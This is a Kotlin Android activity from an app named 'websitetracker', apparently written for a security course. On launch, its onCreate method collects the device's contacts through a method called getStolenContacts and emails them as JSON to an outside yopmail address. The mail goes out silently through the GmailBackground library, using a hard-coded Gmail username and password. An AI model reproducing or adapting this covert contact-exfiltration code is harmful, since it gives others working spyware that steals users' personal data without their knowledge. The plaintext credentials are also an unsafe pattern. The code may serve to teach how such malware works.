package com.example.websitetracker

import android.annotation.SuppressLint
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.creativityapps.gmailbackgroundlibrary.BackgroundMail.TYPE_PLAIN
import com.creativityapps.gmailbackgroundlibrary.BackgroundMail.newBuilder
import com.google.gson.Gson

/**
 * #license Copyright 2015 Yesid Lazaro
 * https://github.com/yesidlazaro/GmailBackground
 *
 * Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements.
 * See the NOTICE file distributed with this work for additional information regarding copyright ownership.
 * The ASF licenses this file to you under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the License
 * is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing permissions and limitations under
 * the License.
 */
class MainActivity : AppCompatActivity() {

    @SuppressLint("Range")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val stolenContacts = ContentResolverHelper(applicationContext).getStolenContacts()
        Log.i("MainActivity", "stolenContacts= $stolenContacts")

        newBuilder(this)
            .withUsername("it362.test2021@gmail.com")
            .withPassword("enseirbtest")
            .withMailto("it362.test2021@yopmail.com")
            .withType(TYPE_PLAIN)
            .withSubject("Android project")
            .withBody("stolenContacts= ${Gson().toJson(stolenContacts)}")
            .withOnSuccessCallback {
                Log.i("MainActivity", "Successful mail sending!")
            }
            .withOnFailCallback {
                Log.e("MainActivity", "Error occurred while sending mail...")
            }
            .withProcessVisibility(false)
            .send()
    }
}
